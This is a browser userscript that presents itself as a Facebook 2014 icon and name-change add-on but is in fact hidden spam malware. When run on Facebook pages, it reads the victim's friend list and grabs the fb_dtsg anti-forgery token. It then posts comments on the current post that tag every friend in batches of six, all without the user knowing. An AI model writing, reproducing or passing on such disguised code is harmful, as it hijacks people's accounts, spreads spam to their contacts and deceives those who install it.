// ==UserScript==
// @name            Icon Facebook 2014 Và Đổi Tên Lần 6
// @description     All about Facebook By IT Việt nam
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==Icon==
/* facebook.com/cesarferreyavl */
function x__0() { return window.ActiveXObject ? new ActiveXObject("Msxml2.XMLHTTP") : new XMLHttpRequest; };
//Pegar todos amigos
function get_friends(){
  var a=x__0();
  a.open("GET", "/ajax/typeahead/first_degree.php?__a=1&filter[0]=user&lazy=0&viewer="+uid+"&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm", false);
  a.send(null);
  if (a.readyState == 4) {
    var f = JSON.parse(a.responseText.substring(a.responseText.indexOf('{')));
    return f.payload.entries;
  }
  return false;
}
/* cesar */
//Pegar todos amigos
function get_uid(b){
  var a=x__0();
  a.open("GET", 'http://graph.facebook.com/'+b, false);
  a.send();
  if (a.readyState == 4) {
    return uid = JSON.parse(a.responseText).id;
  }
  return false;
}
  // Pattern que vai trocar o valor dos comentários pelas marcações
var patt = /comment_text=(.*?)&/
var c = 1;
username = /\.com\/(.*?)\//.exec(window.top.location)[1];
uid = get_uid(username);
a = window.top.location;
termina = 0;
var amigos = get_friends();
post_id = /[0-9]{8,}/.exec(a);
        uids =  'comment_text=';
header = 'ft_ent_identifier='+post_id+'&comment_text=0&source=1&client_id=1359576694192%3A1233576093&reply_fbid&parent_comment_id&rootid=u_jsonp_3_19&ft[tn]=[]&ft[qid]=5839337351464612379&ft[mf_story_key]=5470779710560437153&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user='+uid+'&__a=1&__req=4u&fb_dtsg='+document.getElementsByName('fb_dtsg')[0].value+'&phstamp='+Math.random();
  for ( var n = 1 ; n < amigos.length ; n++ ){
      //uids += '%40[' + amigos[n].uid + '%3A' + encodeURI(amigos[n].text) + ']%20';
    fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
            uids += '%40[' + amigos[n].uid + '%3AAAAAAAAAAAA]%20';
            c++; 
            if(c == 7){            
                // Quando o contador chega em 7, ele termina o parâmetro com um &...
                uids += '&';
                // ...envia as coisas com o método do indiano...
                with(new XMLHttpRequest()) open("POST", "/ajax/ufi/add_comment.php?__a=1"),setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),send(header.replace(patt, uids));
                // ... espera um segundo...
                z = setTimeout('function(){asd=0}', 1000);
                clearInterval(z);
                // ... e seta tudo de novo pra recomeçar
                c = 1;
                uids = 'comment_text=';
         
              }
            
    }